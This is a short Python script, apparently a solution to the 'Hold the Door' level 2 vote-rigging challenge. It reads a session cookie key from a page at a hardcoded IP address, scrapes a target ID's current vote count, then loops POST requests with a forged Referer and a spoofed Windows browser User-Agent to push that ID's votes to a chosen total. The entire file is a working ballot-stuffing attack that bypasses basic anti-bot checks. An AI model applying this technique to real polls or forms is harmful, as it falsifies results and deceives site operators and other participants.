#!/usr/bin/python3
"""Hodor 2
   Use: ./1.py
   The program obtain #votes current and just sending the necessary votes.
   send user windows headers
"""
import requests


try:
    ID = int(input("Input number the ID: "))
except ValueError:
    print("PLEASE: input number integer.")
    exit(98)
try:
    votes = int(input("Input number the votes: "))
except ValueError:
    print("PLEASE: input number integer.")
    exit(98)

url = 'http://158.69.76.135/level2.php'
response = requests.get(url)
key = response.cookies['HoldTheDoor']
data = {'id': ID, 'holdthedoor': 'Submit', 'key': key}
success = 'Hold the Door challenge - Level 1'
ok = 0
fail = 0
cookie = {"HoldTheDoor": key}
votescurrent = 0
txt = response.text.split()
txtid = txt.index(str(ID))
if ((txt[txtid+3]).isdigit()):
    votescurrent = int(txt[txtid+3])
headerwin = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36")
header = {"User-Agent": headerwin, "Referer": url}
print(header)
print("------------------------------------------------------------------")
print("Hello Alzheimeer: ID: {}, VOTES CURRENT: {}, URL: {},  KEY: {}\
".format(ID, votescurrent, url, key))
print("------------------------------------------------------------------")
print(success)
print("------------------------------------------------------------------")

for i in range(votescurrent, votes):
    response1 = requests.post(url, data, cookies=cookie, headers=header)
    if response1.status_code is 200:
        ok += 1
        print("{} Ok ".format(ok), end='\r', flush=True)
    else:
        fail += 1
        print("{} Fail".format(fail), end='\r', flush=True)

print()
print("------------------------------------------------------------------")
print("Finally Alzheimeer: Ok {}, Fail {}".format(ok, fail))
